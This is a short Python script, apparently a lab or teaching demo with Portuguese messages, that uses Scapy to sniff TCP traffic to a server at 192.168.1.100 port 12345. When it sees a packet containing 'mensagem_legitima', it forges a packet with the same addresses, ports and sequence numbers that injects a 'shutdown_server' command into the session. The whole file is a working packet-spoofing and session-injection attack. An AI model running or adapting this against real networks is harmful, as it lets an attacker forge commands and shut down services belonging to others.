from scapy.all import *
from scapy.layers.inet import TCP, IP


def intercept(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors="ignore")

        if "mensagem_legitima" in payload:
            print(f"[!] Interceptado: {payload}")

            spoofed = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
                      TCP(dport=pkt[TCP].dport, sport=pkt[TCP].sport,
                          flags="PA", seq=pkt[TCP].seq, ack=pkt[TCP].ack) / \
                      Raw(load="shutdown_server\n")

            send(spoofed, verbose=0)
            print("[+] Mensagem alterada e reenviada.")


print("[*] Sniffando pacotes para o servidor 192.168.1.100:12345...")
sniff(filter="tcp dst host 192.168.1.100 and port 12345", prn=intercept, store=0)